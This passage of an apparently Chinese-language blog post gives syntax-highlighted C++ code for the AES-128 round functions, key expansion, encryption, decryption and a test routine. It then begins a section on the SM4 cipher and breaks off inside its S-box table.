class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>&#125;,<br>&#123;<span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>&#125;,<br>&#123;<span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>&#125;,<br>&#123;<span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>&#125;,<br>&#123;<span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>&#125;<br>&#125;;<br> <br><br><span class="hljs-comment">//轮常数</span><br>word  Rcon[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0x01000000</span>,<span class="hljs-number">0x02000000</span>,<span class="hljs-number">0x04000000</span>,<span class="hljs-number">0x08000000</span>,<span class="hljs-number">0x10000000</span>,<br>              <span class="hljs-number">0x20000000</span>,<span class="hljs-number">0x40000000</span>,<span class="hljs-number">0x80000000</span>,<span class="hljs-number">0x1B000000</span>,<span class="hljs-number">0x36000000</span>&#125;;<br><br><br><span class="hljs-comment">// S 盒变换-字节替换</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SubBytes</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; ++i)<br>    &#123;<br>        <span class="hljs-type">int</span> row = mtx[i][<span class="hljs-number">7</span>]*<span class="hljs-number">8</span> + mtx[i][<span class="hljs-number">6</span>]*<span class="hljs-number">4</span> + mtx[i][<span class="hljs-number">5</span>]*<span class="hljs-number">2</span> + mtx[i][<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> col = mtx[i][<span class="hljs-number">3</span>]*<span class="hljs-number">8</span> + mtx[i][<span class="hljs-number">2</span>]*<span class="hljs-number">4</span> + mtx[i][<span class="hljs-number">1</span>]*<span class="hljs-number">2</span> + mtx[i][<span class="hljs-number">0</span>];<br>        mtx[i] = Sbox[row][col];<br>    &#125;<br>&#125;              <br><br><span class="hljs-comment">//行变换-按字节循环移位</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiftRows</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 第二行循环左移一位</span><br>byte temp = mtx[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">3</span>; ++i)<br>mtx[i<span class="hljs-number">+4</span>] = mtx[i<span class="hljs-number">+5</span>];<br>mtx[<span class="hljs-number">7</span>] = temp;<br><span class="hljs-comment">// 第三行循环左移两位</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; ++i)<br>&#123;<br>temp = mtx[i<span class="hljs-number">+8</span>];<br>mtx[i<span class="hljs-number">+8</span>] = mtx[i<span class="hljs-number">+10</span>];<br>mtx[i<span class="hljs-number">+10</span>] = temp;<br>&#125;<br><span class="hljs-comment">// 第四行循环左移三位</span><br>temp = mtx[<span class="hljs-number">15</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>; i&gt;<span class="hljs-number">0</span>; --i)<br>mtx[i<span class="hljs-number">+12</span>] = mtx[i<span class="hljs-number">+11</span>];<br>mtx[<span class="hljs-number">12</span>] = temp;<br>&#125;<br><br><span class="hljs-comment">//有限域上的乘法 GF(2^8)</span><br><span class="hljs-function">byte <span class="hljs-title">GFMul</span><span class="hljs-params">(byte a, byte b)</span> </span>&#123; <br>byte p = <span class="hljs-number">0</span>;<br>byte hi_bit_set;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> counter = <span class="hljs-number">0</span>; counter &lt; <span class="hljs-number">8</span>; counter++) &#123;<br><span class="hljs-keyword">if</span> ((b &amp; <span class="hljs-built_in">byte</span>(<span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>p ^= a;<br>&#125;<br>hi_bit_set = (byte) (a &amp; <span class="hljs-built_in">byte</span>(<span class="hljs-number">0x80</span>));<br>a &lt;&lt;= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (hi_bit_set != <span class="hljs-number">0</span>) &#123;<br>a ^= <span class="hljs-number">0x1b</span>; <span class="hljs-comment">/* x^8 + x^4 + x^3 + x + 1 */</span><br>&#125;<br>b &gt;&gt;= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">//列变换</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MixColumns</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>byte arr[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">4</span>; ++j)<br>arr[j] = mtx[i+j*<span class="hljs-number">4</span>];<br> <br>mtx[i] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x02</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x03</span>, arr[<span class="hljs-number">1</span>]) ^ arr[<span class="hljs-number">2</span>] ^ arr[<span class="hljs-number">3</span>];<br>mtx[i<span class="hljs-number">+4</span>] = arr[<span class="hljs-number">0</span>] ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x02</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x03</span>, arr[<span class="hljs-number">2</span>]) ^ arr[<span class="hljs-number">3</span>];<br>mtx[i<span class="hljs-number">+8</span>] = arr[<span class="hljs-number">0</span>] ^ arr[<span class="hljs-number">1</span>] ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x02</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x03</span>, arr[<span class="hljs-number">3</span>]);<br>mtx[i<span class="hljs-number">+12</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x03</span>, arr[<span class="hljs-number">0</span>]) ^ arr[<span class="hljs-number">1</span>] ^ arr[<span class="hljs-number">2</span>] ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x02</span>, arr[<span class="hljs-number">3</span>]);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//轮密钥加变换 - 将每一列与扩展密钥进行异或</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddRoundKey</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>], word k[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>&#123;<br>word k1 = k[i] &gt;&gt; <span class="hljs-number">24</span>;<br>word k2 = (k[i] &lt;&lt; <span class="hljs-number">8</span>) &gt;&gt; <span class="hljs-number">24</span>;<br>word k3 = (k[i] &lt;&lt; <span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">24</span>;<br>word k4 = (k[i] &lt;&lt; <span class="hljs-number">24</span>) &gt;&gt; <span class="hljs-number">24</span>;<br><br>mtx[i] = mtx[i] ^ <span class="hljs-built_in">byte</span>(k<span class="hljs-number">1.</span><span class="hljs-built_in">to_ulong</span>());<br>mtx[i<span class="hljs-number">+4</span>] = mtx[i<span class="hljs-number">+4</span>] ^ <span class="hljs-built_in">byte</span>(k<span class="hljs-number">2.</span><span class="hljs-built_in">to_ulong</span>());<br>mtx[i<span class="hljs-number">+8</span>] = mtx[i<span class="hljs-number">+8</span>] ^ <span class="hljs-built_in">byte</span>(k<span class="hljs-number">3.</span><span class="hljs-built_in">to_ulong</span>());<br>mtx[i<span class="hljs-number">+12</span>] = mtx[i<span class="hljs-number">+12</span>] ^ <span class="hljs-built_in">byte</span>(k<span class="hljs-number">4.</span><span class="hljs-built_in">to_ulong</span>());<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//解密的逆变换函数</span><br><span class="hljs-comment">//逆 S 盒变换</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvSubBytes</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; ++i)<br>&#123;<br><span class="hljs-type">int</span> row = mtx[i][<span class="hljs-number">7</span>]*<span class="hljs-number">8</span> + mtx[i][<span class="hljs-number">6</span>]*<span class="hljs-number">4</span> + mtx[i][<span class="hljs-number">5</span>]*<span class="hljs-number">2</span> + mtx[i][<span class="hljs-number">4</span>];<br><span class="hljs-type">int</span> col = mtx[i][<span class="hljs-number">3</span>]*<span class="hljs-number">8</span> + mtx[i][<span class="hljs-number">2</span>]*<span class="hljs-number">4</span> + mtx[i][<span class="hljs-number">1</span>]*<span class="hljs-number">2</span> + mtx[i][<span class="hljs-number">0</span>];<br>mtx[i] = Inv_Sbox[row][col];<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//逆行变换-以字节为单位循环右移</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvShiftRows</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 第二行循环右移一位</span><br>byte temp = mtx[<span class="hljs-number">7</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>; i&gt;<span class="hljs-number">0</span>; --i)<br>mtx[i<span class="hljs-number">+4</span>] = mtx[i<span class="hljs-number">+3</span>];<br>mtx[<span class="hljs-number">4</span>] = temp;<br><span class="hljs-comment">// 第三行循环右移两位</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; ++i)<br>&#123;<br>temp = mtx[i<span class="hljs-number">+8</span>];<br>mtx[i<span class="hljs-number">+8</span>] = mtx[i<span class="hljs-number">+10</span>];<br>mtx[i<span class="hljs-number">+10</span>] = temp;<br>&#125;<br><span class="hljs-comment">// 第四行循环右移三位</span><br>temp = mtx[<span class="hljs-number">12</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">3</span>; ++i)<br>mtx[i<span class="hljs-number">+12</span>] = mtx[i<span class="hljs-number">+13</span>];<br>mtx[<span class="hljs-number">15</span>] = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvMixColumns</span><span class="hljs-params">(byte mtx[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>byte arr[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">4</span>; ++j)<br>arr[j] = mtx[i+j*<span class="hljs-number">4</span>];<br> <br>mtx[i] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">3</span>]);<br>mtx[i<span class="hljs-number">+4</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">3</span>]);<br>mtx[i<span class="hljs-number">+8</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">3</span>]);<br>mtx[i<span class="hljs-number">+12</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">3</span>]);<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//密钥拓展</span><br><span class="hljs-comment">//将4个8位的字节组成一个32位的字</span><br><span class="hljs-function">word <span class="hljs-title">Word</span> <span class="hljs-params">(byte&amp;k1,byte&amp;k2,byte&amp;k3,byte&amp;k4)</span></span>&#123;<br>    <span class="hljs-function">word <span class="hljs-title">result</span><span class="hljs-params">(<span class="hljs-number">0x00000000</span>)</span></span>;<br>    word temp;<br>    temp=k<span class="hljs-number">1.</span><span class="hljs-built_in">to_ulong</span>();<br>    temp&lt;&lt;=<span class="hljs-number">24</span>;<br>    result|=temp;<br>    temp=k<span class="hljs-number">2.</span><span class="hljs-built_in">to_ulong</span>();<br>    temp&lt;&lt;=<span class="hljs-number">16</span>;<br>    result|=temp;<br>    temp=k<span class="hljs-number">3.</span><span class="hljs-built_in">to_ulong</span>();<br>    temp&lt;&lt;=<span class="hljs-number">8</span>;<br>    result|=temp;<br>    temp=k<span class="hljs-number">4.</span><span class="hljs-built_in">to_ulong</span>();<br>    result|=temp;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">//把一个4字节的word中的字节左移一位</span><br><span class="hljs-comment">//[a,b,c,d]=&gt;[b,c,d,a]</span><br><span class="hljs-function">word <span class="hljs-title">RotWord</span><span class="hljs-params">(<span class="hljs-type">const</span> word&amp;rw)</span></span>&#123;<br>    word high=rw&lt;&lt;<span class="hljs-number">8</span>;<br>    word low=rw&gt;&gt;<span class="hljs-number">24</span>;<br>    <span class="hljs-keyword">return</span> high|low;<br>&#125;<br><br><span class="hljs-comment">//对输入word中的每一个字节进行S盒变换</span><br><span class="hljs-function">word <span class="hljs-title">SubWord</span><span class="hljs-params">(<span class="hljs-type">const</span> word&amp; sw)</span></span>&#123;<br>   word temp;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i+=<span class="hljs-number">8</span>)&#123;<br>    <span class="hljs-type">int</span> row=sw[i<span class="hljs-number">+7</span>]*<span class="hljs-number">8</span>+sw[i<span class="hljs-number">+6</span>]*<span class="hljs-number">4</span>+sw[i<span class="hljs-number">+5</span>]*<span class="hljs-number">2</span>+sw[i<span class="hljs-number">+4</span>];<br>    <span class="hljs-type">int</span> col=sw[i<span class="hljs-number">+3</span>]*<span class="hljs-number">8</span>+sw[i<span class="hljs-number">+2</span>]*<span class="hljs-number">4</span>+sw[i<span class="hljs-number">+1</span>]*<span class="hljs-number">2</span>+sw[i];<br>    byte val =Sbox[row][col];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">8</span>;++j)&#123;<br>        temp[i+j]=val[j];<br>    &#125;<br>   &#125;<br>   <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-comment">//密钥扩展函数-对128位密钥拓展得到 w[4*(Nr+1)]</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KeyExpansion</span><span class="hljs-params">(byte key[<span class="hljs-number">4</span>*Nk],word w[<span class="hljs-number">4</span>*(Nr<span class="hljs-number">+1</span>)])</span></span>&#123;<br>    word temp;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">while</span>(i&lt;Nk)&#123;<br>        <span class="hljs-comment">// w[]的前4个就是输入的key</span><br>        w[i]=<span class="hljs-built_in">Word</span>(key[<span class="hljs-number">4</span>*i],key[<span class="hljs-number">4</span>*i<span class="hljs-number">+1</span>],key[<span class="hljs-number">4</span>*i<span class="hljs-number">+2</span>],key[<span class="hljs-number">4</span>*i<span class="hljs-number">+3</span>]);<br>        ++i;<br>    &#125;<br><br>    i=Nk;<br>    <span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">4</span>*(Nr<span class="hljs-number">+1</span>))&#123;<br>        temp=w[i<span class="hljs-number">-1</span>]; <span class="hljs-comment">// 记录前一个word</span><br>        <span class="hljs-keyword">if</span>(i%Nk==<span class="hljs-number">0</span>)<br>            w[i]=w[i-Nk]^<span class="hljs-built_in">SubWord</span>(<span class="hljs-built_in">RotWord</span>(temp))^Rcon[i/Nk<span class="hljs-number">-1</span>];<br>        <span class="hljs-keyword">else</span><br>            w[i]=w[i-Nk]^temp;<br>        ++i;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//加解密函数</span><br><span class="hljs-comment">//加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(byte in[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>], word w[<span class="hljs-number">4</span>*(Nr<span class="hljs-number">+1</span>)])</span></span><br><span class="hljs-function"></span>&#123;<br>word key[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br> <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> round=<span class="hljs-number">1</span>; round&lt;Nr; ++round)<br>&#123;<br><span class="hljs-built_in">SubBytes</span>(in);<br><span class="hljs-built_in">ShiftRows</span>(in);<br><span class="hljs-built_in">MixColumns</span>(in);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[<span class="hljs-number">4</span>*round+i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br>&#125;<br> <br><span class="hljs-built_in">SubBytes</span>(in);<br><span class="hljs-built_in">ShiftRows</span>(in);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[<span class="hljs-number">4</span>*Nr+i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br>&#125;<br><br><span class="hljs-comment">//解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(byte in[<span class="hljs-number">4</span>*<span class="hljs-number">4</span>], word w[<span class="hljs-number">4</span>*(Nr<span class="hljs-number">+1</span>)])</span></span><br><span class="hljs-function"></span>&#123;<br>word key[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[<span class="hljs-number">4</span>*Nr+i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br> <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> round=Nr<span class="hljs-number">-1</span>; round&gt;<span class="hljs-number">0</span>; --round)<br>&#123;<br><span class="hljs-built_in">InvShiftRows</span>(in);<br><span class="hljs-built_in">InvSubBytes</span>(in);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[<span class="hljs-number">4</span>*round+i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br><span class="hljs-built_in">InvMixColumns</span>(in);<br>&#125;<br> <br><span class="hljs-built_in">InvShiftRows</span>(in);<br><span class="hljs-built_in">InvSubBytes</span>(in);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i)<br>key[i] = w[i];<br><span class="hljs-built_in">AddRoundKey</span>(in, key);<br>&#125;<br><br><br><span class="hljs-comment">//test</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    byte key[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x2b</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <br>        <span class="hljs-number">0x28</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0xa6</span>, <br>        <span class="hljs-number">0xab</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x88</span>, <br>        <span class="hljs-number">0x09</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x3c</span>&#125;;<br><br>    byte plain[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0x32</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xe0</span>, <br>        <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x37</span>,<br>        <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x07</span>,<br>        <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x34</span>&#125;; <br>    <span class="hljs-comment">//输出密钥</span><br>    cout&lt;&lt;<span class="hljs-string">&quot;key is: &quot;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;++i)&#123;<br>        cout&lt;&lt;hex&lt;&lt;key[i].<span class="hljs-built_in">to_ulong</span>()&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout&lt;&lt;endl;<br><br>    word w[<span class="hljs-number">4</span>*(Nr<span class="hljs-number">+1</span>)];<br><span class="hljs-built_in">KeyExpansion</span>(key, w);<br><br>    <span class="hljs-comment">//输出待加密的明文</span><br>    cout&lt;&lt;<span class="hljs-string">&quot;plaintext is: &quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; ++i)<br>&#123;<br>cout &lt;&lt; hex &lt;&lt; plain[i].<span class="hljs-built_in">to_ulong</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-keyword">if</span>((i<span class="hljs-number">+1</span>)%<span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>cout &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; endl;<br>    <br>    <span class="hljs-comment">//加密</span><br>    <span class="hljs-built_in">encrypt</span>(plain, w);<br>    <span class="hljs-comment">//输出加密后的密文</span><br>    cout&lt;&lt;<span class="hljs-string">&quot;encodetext is: &quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; ++i)<br>&#123;<br>cout &lt;&lt; hex &lt;&lt; plain[i].<span class="hljs-built_in">to_ulong</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-keyword">if</span>((i<span class="hljs-number">+1</span>)%<span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>cout &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; endl;<br><br>    <span class="hljs-comment">//解密</span><br>    <span class="hljs-built_in">decrypt</span>(plain, w);<br>    <span class="hljs-comment">//输出解密后的明文</span><br>    cout&lt;&lt;<span class="hljs-string">&quot;decodetext is: &quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; ++i)<br>&#123;<br>cout &lt;&lt; hex &lt;&lt; plain[i].<span class="hljs-built_in">to_ulong</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-keyword">if</span>((i<span class="hljs-number">+1</span>)%<span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>cout &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h3><ul><li>明文分组长度为128位，密钥长度为128位</li><li>16x16的S盒</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">static const unsigned char SboxTable[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] =<br>&#123;<br>    &#123;<span class="hljs-number">0xd6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x28</span>, <span 